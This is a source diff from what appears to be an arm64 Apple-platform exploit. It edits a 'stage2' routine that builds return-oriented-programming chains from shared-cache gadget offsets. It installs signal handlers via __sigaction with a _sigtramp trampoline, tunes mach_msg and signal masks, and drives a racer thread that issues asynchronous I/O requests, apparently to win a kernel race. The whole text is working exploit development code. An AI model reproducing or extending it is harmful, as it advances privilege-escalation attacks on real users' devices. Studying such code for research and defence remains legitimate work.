@@ -646,18 +646,19 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	snprintf(&buf,sizeof(buf),"testing...");
 	DEFINE_ROP_VAR("test_string",sizeof(buf),buf);
 
-#if 1
+#if 0
 	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),&buf);
 	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
 
-	struct sigaction * myaction = malloc(sizeof(struct sigaction));
-	memset(myaction,0,sizeof(struct sigaction));
+	struct __sigaction * myaction = malloc(sizeof(struct __sigaction));
+	memset(myaction,0,sizeof(struct __sigaction));
 	myaction->sa_handler = offsets->rop_nop-0x180000000+offsets->new_cache_addr;
+	myaction->sa_tramp = get_addr_from_name(offsets,"_sigtramp")-0x180000000+offsets->new_cache_addr; //offsets->longjmp-0x180000000+offsets->new_cache_addr;
 	myaction->sa_mask = (1 << (SIGWINCH-1));
-	DEFINE_ROP_VAR("my_action",sizeof(struct sigaction),myaction);
+	DEFINE_ROP_VAR("my_action",sizeof(struct __sigaction),myaction);
 	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("my_action",1);
-	CALL("sigaction",SIGWINCH,0,0,0,0,0,0,0);
+	ROP_VAR_ARG("my_action",2);
+	CALL("__sigaction",SIGWINCH,0,0,0,0,0,0,0);
 
 	uint64_t * test_break_val = malloc(8);
 	*test_break_val = 0;
@@ -784,7 +785,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	SET_ROP_VAR64("mysigmask",(1 << (SIGWINCH-1)));
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("mysigmask",2);
-	CALL("__pthread_sigmask",SIG_SETMASK,0,0,0,0,0,0,0);
+	CALL("__pthread_sigmask",SIG_BLOCK,0,0,0,0,0,0,0);
 
 #define BARRIER_BUFFER_SIZE 0x10000
 	// spawn racer thread
@@ -1086,18 +1087,9 @@ _STRUCT_ARM_THREAD_STATE64
 	DEFINE_ROP_VAR("aios",NENT * sizeof(struct aiocb),tmp);
 	DEFINE_ROP_VAR("aio_buf",NENT,tmp);
 
-	struct sigaction * myaction = malloc(sizeof(struct sigaction));
-	memset(myaction,0,sizeof(struct sigaction));
-	myaction->sa_handler = offsets->rop_nop-0x180000000+offsets->new_cache_addr;
-	myaction->sa_mask = (1 << (SIGWINCH-1));
-	DEFINE_ROP_VAR("my_action",sizeof(struct sigaction),myaction);
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("my_action",1);
-	CALL("sigaction",SIGWINCH,0,0,0,0,0,0,0);
-
 	DEFINE_ROP_VAR("sigevent",sizeof(struct sigevent),tmp);
-	SET_ROP_VAR32_W_OFFSET("sigevent",offsetof(struct sigevent,sigev_notify),SIGEV_SIGNAL);
-	SET_ROP_VAR32_W_OFFSET("sigevent",offsetof(struct sigevent,sigev_signo),SIGWINCH);
+	SET_ROP_VAR32_W_OFFSET("sigevent",SIGEV_SIGNAL,offsetof(struct sigevent,sigev_notify));
+	SET_ROP_VAR32_W_OFFSET("sigevent",SIGWINCH,offsetof(struct sigevent,sigev_signo));
 
 	DEFINE_ROP_VAR("signal_set",sizeof(sigset_t),tmp);
 	ROP_VAR_ARG_HOW_MANY(1);
@@ -1110,11 +1102,17 @@ _STRUCT_ARM_THREAD_STATE64
 
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("signal_set",2);
-	CALL("sigprocmask",SIG_UNBLOCK,0,NULL,0,0,0,0,0);
-
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("signal_set",2);
 	CALL("__pthread_sigmask",SIG_UNBLOCK,0,NULL,0,0,0,0,0);
+
+	struct __sigaction * myaction = malloc(sizeof(struct __sigaction));
+	memset(myaction,0,sizeof(struct __sigaction));
+	myaction->sa_handler = offsets->rop_nop-0x180000000+offsets->new_cache_addr;
+	myaction->sa_tramp = get_addr_from_name(offsets,"_sigtramp")-0x180000000+offsets->new_cache_addr;
+	myaction->sa_mask = (1 << (SIGWINCH-1));
+	DEFINE_ROP_VAR("my_action",sizeof(struct __sigaction),myaction);
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("my_action",2);
+	CALL("__sigaction",SIGWINCH,0,0,0,0,0,0,0);
 
 	// TODO: we can optimize this
 	for (uint32_t i = 0; i < NENT; i++) {
@@ -1124,8 +1122,9 @@ _STRUCT_ARM_THREAD_STATE64
 		SET_ROP_VAR64_TO_VAR_W_OFFSET("aios",offset+offsetof(struct aiocb,aio_buf),"aio_buf",i);
 		SET_ROP_VAR64_W_OFFSET("aios",1,offset + offsetof(struct aiocb,aio_nbytes));
 		SET_ROP_VAR32_W_OFFSET("aios",LIO_READ,offset + offsetof(struct aiocb,aio_lio_opcode)); 
-		SET_ROP_VAR32_W_OFFSET("aios",SIGEV_SIGNAL,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify));
-		SET_ROP_VAR32_W_OFFSET("aios",SIGWINCH,offset + offsetof(struct aiocb,aio_sigevent.sigev_signo));
+		SET_ROP_VAR32_W_OFFSET("aios",SIGEV_NONE,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify));
+		//SET_ROP_VAR32_W_OFFSET("aios",SIGEV_SIGNAL,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify));
+		//SET_ROP_VAR32_W_OFFSET("aios",SIGWINCH,offset + offsetof(struct aiocb,aio_sigevent.sigev_signo));
 
 		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list",i*8,"aios",offset);
 	}
@@ -1139,9 +1138,13 @@ _STRUCT_ARM_THREAD_STATE64
 		
 		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG64("reply_port",5); 
-		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_MSG_TIMEOUT_NONE,0,0,0 /*recv port*/, 0, MACH_PORT_NULL,0);
+		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_RCV_TIMEOUT,0,0,0 /*recv port*/, 1, MACH_PORT_NULL,0);
 
-		for (int i = 0; i < 0x100;i++) {ADD_GADGET();}
+		for (int i = 0; i < NENT; i++) {
+			ROP_VAR_ARG_HOW_MANY(1);
+			ROP_VAR_ARG64_W_OFFSET("aio_list",1,i*8);
+			CALL("aio_return",0,0,0,0,0,0,0,0);
+		}
 
 		// set x0 
 		SET_X0_FROM_ROP_VAR("should_race");
